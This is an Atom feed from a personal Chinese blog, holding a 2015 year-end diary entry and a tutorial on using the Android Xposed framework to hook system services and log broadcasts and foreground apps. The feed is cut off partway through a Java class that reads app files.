<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[idhyt's blog]]></title>
  <subtitle><![CDATA[云淡风轻]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://blog.idhyt.com/"/>
  <updated>2016-01-03T10:08:54.000Z</updated>
  <id>http://blog.idhyt.com/</id>
  
  <author>
    <name><![CDATA[idhyt]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[我的2015]]></title>
    <link href="http://blog.idhyt.com/2016/01/01/diary-annual-summary-2015/"/>
    <id>http://blog.idhyt.com/2016/01/01/diary-annual-summary-2015/</id>
    <published>2015-12-31T18:40:11.000Z</published>
    <updated>2016-01-03T10:08:54.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;昨晚失眠，做了一个梦，仿佛回到了从前，也仿佛穿越到了不远的将来，半梦半醒中依稀记得是一个悬疑故事，里边很多熟悉的人，眯着眼睛拿着手机记录了一些情节，打算写篇小说。</p>
<hr>

<p>&#160; &#160; &#160; &#160;今年的跨年异常冷清，公司早早的都没有人，出去走了一圈，可能是有些晚的缘故，路边和商场都没有人，或许是我没走对路，又或许是太晚了，于是去吃了鸡肉卷外加四个鸡翅，迎接新年的到来。2016你好，2015再见。</p>
<hr>

<p>&#160; &#160; &#160; &#160;惯性思维的回想了下今年的生活轨迹，好像能想起来的真的挺少的，工作的缘故，业余生活也基本没有了，朋友越来越少，所有记住的东西也就没多少了。今年工作已经切到移动端了，但是感觉成长总是很慢很慢，越来越迷茫，好像想要的工作方式都要忘记了，生活上也有些烦恼，意外的惊喜与瞬间的跌落，然后莫名奇妙的删了别人的微信，总觉得自己对任何事情都能很理智的去控制，但在某个时刻依然会想那么多。那时候我有这样一种想法，放下工作出去走走，迷茫也好，逃避也罢，我甚至已经拿出地图研究好了如何完整的走完整个鸡形地图，可能一切的想法都是出去放松的借口，可能想那么多又有什么用呢。或许又是意外的去学了游泳将我注意力转到了游泳上边，慢慢的想法也没有那么强烈了，但是总觉得这种想法会在某个特定的时间点等我去做且不可不做。</p>
<hr>

<p>&#160; &#160; &#160; &#160;8月份请了年假回家了一周，顺便把身份证和驾驶证都换了，还办了护照和签证，回来后换了房子室友还有两条狗。再然后就是参加了新项目并且突然被派去北京出差了一个月，就在去北京的前一天我可是已经订好了去上海参加会议的机票了，朋友都约好了，真是个悲伤的故事，其实我真的还挺想去上海看看。北京的一个月出差也是记忆深刻，每天除了工作就是睡觉，总结下来就是忙成狗，好几个朋友都没有见。还有，天冷是测试吃货的最好环境，不吃冷啊，所有回来妥妥胖了6斤，还好减了下来了。毕业之前有在北京实习过将近一年，所以对北京还比较了解，在北京出差过程中也感受到了很多奇奇怪怪的想法和令人诧异的工作气氛，他们用成功学告诉你什么是梦想，告诉你要有追求，告诉你要表现出欲望，告诉你这些他都不care，我不能怂，可我特么连生活问题都还没解决让我拿什么画梦想，很多时候不是说对物质没有追求，而是不想把暂时得不到的东西看的太重，不是没有不行，而是有了更好。想到了之前看的一个故事，黄鼠狼在养鸡场的山崖边立了块碑，上面写着：“抛弃传统的禁锢，不勇敢的跳下去，你怎么知道自己不是一只鹰！” 接下来这畜生每天就在崖底吃着摔下来的鸡。这个故事告诉我们，阅读所谓的“心灵鸡汤”需要智商和智慧，大多鸡汤都是黄鼠狼炖的。这又是一个悲伤的故事。</p>
<hr>

<p>&#160; &#160; &#160; &#160;仔细想想最有成就感的事情好像就是把游泳学会了，还是蛙泳，不过也多亏了一个热心的大(shu)哥(shu)指导，不然我还是用狗刨的姿态在蛙泳。其中也间歇性的在跑步，不过跑步也要看状态，有时候一周每天都跑，有时候也会隔天跑，运行这种事情真的要随性，一旦以某种目的去运动，总觉得失去了很多心态上的东西，可能我是不喜欢有压力的感觉。游戏也没怎么玩了，年初在网咖冲的钱用到现在还有400多，想想都是坑，上半年倒是又玩了两个月的大话西游，不过最后把东西全卖了还赚了几百开钱，当时想想还挺开心的，后来我折合了下时间，平均一小时连10块钱都没赚到，这还是一个悲伤的故事。</p>
<hr>

<p>&#160; &#160; &#160; &#160;突然又是一年，总恍惚的觉得有些不可思议，前两天又看到了读研时候爬山拍的mv，又想到了那些欢乐的时光，那些熟悉的人，毕业以后就再也没有见到过了，人的惰性总会让人长久活在自己的世界里，忽然有天想去找个朋友聊聊天，我该去找谁，互联网时代，出门不带没有电话没有短信的手机也会没有安全感，作为一个互联网工作者，不是是幸运的还是不幸的。</p>
<hr>

<p>&#160; &#160; &#160; &#160;凌晨朋友圈又在刷新年祝福和新年愿望，又到许愿的时候了，翻了翻前几年总结写的愿望，一个都没有实现，再想想一直希望的事情，我特么连2011年的愿望都还没实现，满屏幕悲伤的故事，就不许愿了吧，怕想多了神灯也救不了我，如果必须有个愿望来证明2016来了，那么我就祝福我的朋友愿望都能如愿以偿吧，因为我是好人?雷锋:神灯。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;昨晚失眠，做了一个梦，仿佛回到了从前，也仿佛穿越到了不远的将来，半梦半醒中依稀记得是一个悬疑故事，里边很多熟悉的人，眯着眼睛拿着手机记录了一些情节，打算写篇小说。</p>
<hr>

<p>&#160; &#160; &]]>
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓注入框架Xposed用法详解]]></title>
    <link href="http://blog.idhyt.com/2015/11/28/android-injection-xposed-usage/"/>
    <id>http://blog.idhyt.com/2015/11/28/android-injection-xposed-usage/</id>
    <published>2015-11-27T17:11:11.000Z</published>
    <updated>2015-12-30T09:31:02.000Z</updated>
    <content type="html"><![CDATA[<p>&#160;&#160;&#160;&#160;之前<a href="http://blog.idhyt.com/2015/09/25/4-android-injection-xposed/">安卓注入框架Xposed分析与简单应用</a>只是简单的了解了一下xposed框架，知道如何hook函数，并没有深入去使用，也不知道这个框架能用到哪种程度，最近详细的总结了下，简单来说就是，没有hook不到的地方，只有你想不到的地方。</p>
<h2 id="接管系统所有广播包">接管系统所有广播包</h2><p>&#160;&#160;&#160;&#160;在Android四大组件中，Broadcast是一种广泛运用的在应用程序之间传输信息的机制。而BroadcastReceiver 是对发送出来的Broadcast进行过滤接受并响应的一类组件。应用通过BroadcastReceiver对一个外部的事件做出响应，这是非常有意思的，当开机，锁屏等外部事件到来的时候，可以利用BroadcastReceiver进行相应的处理。如果你能接管所有的广播包，基本上就接管了整个系统的信息传输过程。广播包也是频繁唤醒手机的一个重要原因，通过管理这些广播包，可以达到省电效果。</p>
<p>通过阅读源代码中<br><a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/com/android/server/firewall/IntentFirewall.java#IntentFirewall" target="_blank" rel="external">IntentFirewall</a>这个类，126行代码开始有一些以<code>check</code>开头的方法，说明如下:</p>
<pre><code>This is called from ActivityManager to<span class="instruction"> check </span>if a start activity intent should be allowed. It is assumed the caller is already holding the global ActivityManagerService lock.
</code></pre><p>说明很清晰的告诉我们，所有activity启动时，会到这里做相应的检测是否被允许，因此我们hook掉<code>checkBroadcast</code>方法，就可以控制所有的广播包走向。checkBroadcast代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkBroadcast</span><span class="params">(Intent intent, <span class="keyword">int</span> callerUid, <span class="keyword">int</span> callerPid,</span><br><span class="line">    String resolvedType, <span class="keyword">int</span> receivingUid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> checkIntent(mBroadcastResolver, intent.getComponent(), TYPE_BROADCAST, intent, callerUid, callerPid, resolvedType, receivingUid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里，我通过hook该方法并获取到第一个参数<code>Intent intent</code>，然后就可以获取到广播类型，同时也可以获取到该广播的发送者(callerUid)和接受者(receivingUid)，hook代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hook_method(<span class="string">"com.android.server.firewall.IntentFirewall"</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">"checkBroadcast"</span>,</span><br><span class="line">                Intent.class,   <span class="comment">// intent</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// callerUid</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// callerPid</span></span><br><span class="line">                String.class,   <span class="comment">// resolvedType</span></span><br><span class="line">                <span class="keyword">int</span>.class,  <span class="comment">// receivingUid</span></span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> callerUid = (<span class="keyword">int</span>) param.args[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">int</span> receivingUid = (<span class="keyword">int</span>) param.args[<span class="number">4</span>];</span><br><span class="line">                XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"broadcast from "</span> + callerUid + <span class="string">" to "</span> + receivingUid);</span><br><span class="line"></span><br><span class="line">                Intent intent = (Intent) param.args[<span class="number">0</span>];</span><br><span class="line">                String action = intent.getAction();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (action == <span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">if</span> (action.equals(<span class="string">"android.intent.action.SCREEN_OFF"</span>))</span><br><span class="line">                    XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"screen off"</span>);</span><br><span class="line">                <span class="keyword">if</span> (action.equals(<span class="string">"android.intent.action.SCREEN_ON"</span>))</span><br><span class="line">                    XposedBridge.log(<span class="string">"hook IntentFirewall.checkBroadcast : "</span> + <span class="string">"screen on"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>打印锁屏和亮屏的广播事件，结果如下所示：<br>过滤日志<code>adb logcat | grep checkBroadcast</code></p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-usage-1.jpg" alt="checkBroadcast"></p>
<h2 id="嵌套hook监控前台应用">嵌套hook监控前台应用</h2><p>&#160;&#160;&#160;&#160;在编写代码时候，要实现实时监控前台应用是相当棘手的一件事情，并且在5.11以后的版本获取所有运行app都已经受到限制，stackoverflow中给出了一种方法，<a href="http://stackoverflow.com/questions/30619349/android-5-1-1-and-above-getrunningappprocesses-returns-my-application-packag" target="_blank" rel="external">Get Running Apps on M with no permissions &amp; get the foreground app on Android 5.1.1+</a>，测试了获取前台应用的代码相当耗性能。这里基于xposed框架给出另外一种方法。</p>
<p>同样通过阅读源代码中的<a href="http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/com/android/server/net/NetworkPolicyManagerService.java" target="_blank" rel="external">NetworkPolicyManagerService</a>这个类，找到回调函数<code>onForegroundActivitiesChanged</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">private</span> IProcessObserver mProcessObserver = <span class="keyword">new</span> IProcessObserver.Stub() &#123;</span><br><span class="line"></span><br><span class="line">	<span class="annotation">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onForegroundActivitiesChanged</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> uid, <span class="keyword">boolean</span> foregroundActivities)</span> </span>&#123;</span><br><span class="line">  	&#125;</span><br><span class="line"></span><br><span class="line">  	<span class="annotation">@Override</span></span><br><span class="line">  	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProcessStateChanged</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> uid, <span class="keyword">int</span> procState)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">synchronized</span> (mRulesLock) &#123;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ActivityManager服务中IProcessObserver有个回调函数onForegroundActivitiesChanged。而动态设置网络连接规则的时候，NetworkPolicyManagerService服务通过检测系统发出的一些相关事件（在NetworkPolicyManagerService的启动systemReady函数中注册），其中会调用ActivityManager服务中IProcessObserver的onForegroundActivitiesChanged及onProcessDied回调事件，因此，我们通过hook服务类NetworkPolicyManagerService中的onForegroundActivitiesChanged回调函数来监控前台应用，但是这个过程必须保证在systemReady函数已启动注册了该服务，因此需要嵌套hook。具体过程如下：</p>
<blockquote>
<ol>
<li>hook systemReady函数</li>
<li>通过<code>param.thisObject</code>获取hook方法所在类的实例，<br>即<code>NetworkPolicyManagerService.class</code></li>
<li>通过<code>getObjectField</code>获取类中的对象<code>mProcessObserver</code></li>
<li>hook对象<code>mProcessObserver</code>中的<code>onForegroundActivitiesChanged</code>方法</li>
</ol>
</blockquote>
<p>完整代码如下所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hook_method(<span class="string">"com.android.server.net.NetworkPolicyManagerService"</span>,</span><br><span class="line">                lpparam.classLoader,</span><br><span class="line">                <span class="string">"systemReady"</span>,</span><br><span class="line">                <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady"</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady : "</span> + param.thisObject.getClass());</span><br><span class="line"></span><br><span class="line">                Object mProcessObserverClass = XposedHelpers.getObjectField(param.thisObject, <span class="string">"mProcessObserver"</span>);</span><br><span class="line">                XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.systemReady : "</span> + mProcessObserverClass.getClass());</span><br><span class="line"></span><br><span class="line">                hook_method(mProcessObserverClass.getClass(),</span><br><span class="line">                        <span class="string">"onForegroundActivitiesChanged"</span>,</span><br><span class="line">                        <span class="keyword">int</span>.class,  <span class="comment">// pid</span></span><br><span class="line">                        <span class="keyword">int</span>.class,  <span class="comment">// uid</span></span><br><span class="line">                        <span class="keyword">boolean</span>.class, <span class="comment">// foregroundActivities</span></span><br><span class="line">                        <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                    <span class="annotation">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> ((<span class="keyword">boolean</span>) param.args[<span class="number">2</span>])</span><br><span class="line">                            XposedBridge.log(<span class="string">"hook NetworkPolicyManagerService.onForegroundActivitiesChanged : foreground uid = "</span> + param.args[<span class="number">1</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure>
<p>打印前台应用，结果如下所示：<br>过滤日志<code>adb logcat | grep onForegroundActivitiesChanged</code></p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/android-xposed-usage-2.jpg" alt="onForegroundActivitiesChanged"></p>
<h2 id="xposed进程读取文件">xposed进程读取文件</h2><p>&#160;&#160;&#160;&#160;有时候需要xposed进程根据我们自身进程的设置来执行不同的逻辑功能，因此需要xposed进程读取我们进程的配置文件。xposed框架中提供了读取<code>data/data/package name/shared_prefs</code>目录下的xml配置文件功能类<code>XSharedPreferences</code>，该类继承了系统类<code>SharedPreferences</code>并提供类额外的<code>reload</code>方法，当我们配置文件更新后，可以调用该方法重新加载。</p>
<p>&#160;&#160;&#160;&#160;需要注意的是，该类只支持读操作，如果你尝试去执行写操作会抛异常。至于为什么作者没有添加写权限，作者也给出了详细的解释，详见：<a href="https://github.com/rovo89/XposedBridge/issues/63" target="_blank" rel="external">Cannot Write into a Shared Preferences File</a></p>
<p>&#160;&#160;&#160;&#160;我在使用的过程中，需要读取files目录下的json文件内容，使用时发现该类只能读取xml文件，作为jar导入包又不适合修改，因此仿照XSharedPreferences写了一个可以读取任何文件内容的<code>XFile</code>类，其实可以逐渐完善读更多文件类型的内容，包括数据库等。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.idhyt.xposedExtend;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.JSONException;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.SELinuxHelper;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.services.FileResult;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> *</span><br><span class="line"> * Created by idhyt on 2015/12/10.</span><br><span class="line"> *</span><br><span class="line"> * This class is used to read file from data/data/xxx/files directory,</span><br><span class="line"> * same as XSharedPreferences, read-only and without listeners support.</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XFiles</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"XFiles"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> File mFile;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String mFilename;</span><br><span class="line">    <span class="keyword">private</span> ByteArrayOutputStream mFileOutputStream;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> mLoaded = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> mLastModified;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> mFileSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Read settings from the specified file.</span><br><span class="line">     * <span class="doctag">@param</span> file The file to read.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(File file)</span> </span>&#123;</span><br><span class="line">        mFile = file;</span><br><span class="line">        mFilename = mFile.getAbsolutePath();</span><br><span class="line">        startLoadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> packageName The package name.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(String packageName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(packageName, packageName + <span class="string">"_files"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> packageName The package name.</span><br><span class="line">     * <span class="doctag">@param</span> fileName The file name with suffix (.txt, .json, etc..)</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(String packageName, String fileName)</span> </span>&#123;</span><br><span class="line">        mFile = <span class="keyword">new</span> File(Environment.getDataDirectory(), <span class="string">"data/"</span> + packageName + <span class="string">"/files/"</span> + fileName);</span><br><span class="line">        mFilename = mFile.getAbsolutePath();</span><br><span class="line">        startLoadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Tries to make the files file world-readable.</span><br><span class="line">     *</span><br><span class="line">     * This will only work if executed as root (e.g. &#123;<span class="doctag">@code</span> initZygote()&#125;) and only if SELinux is disabled.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; in case the file could be made world-readable.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">makeWorldReadable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!SELinuxHelper.getAppDataFileService().hasDirectFileAccess())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; <span class="comment">// It doesn't make much sense to make the file readable if we wouldn't be able to access it anyway.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mFile.exists()) <span class="comment">// Just in case - the file should never be created if it doesn't exist.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mFile.setReadable(<span class="keyword">true</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Returns the file that is backing these preferences.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; The file might not be accessible directly.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> File <span class="title">getFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startLoadFromDisk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            mLoaded = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="string">"XFiles-load"</span>) &#123;</span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (XFiles.<span class="keyword">this</span>) &#123;</span><br><span class="line">                    loadFromDiskLocked();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@SuppressWarnings</span>(&#123; <span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span> &#125;)</span><br><span class="line">    <span class="function"><span 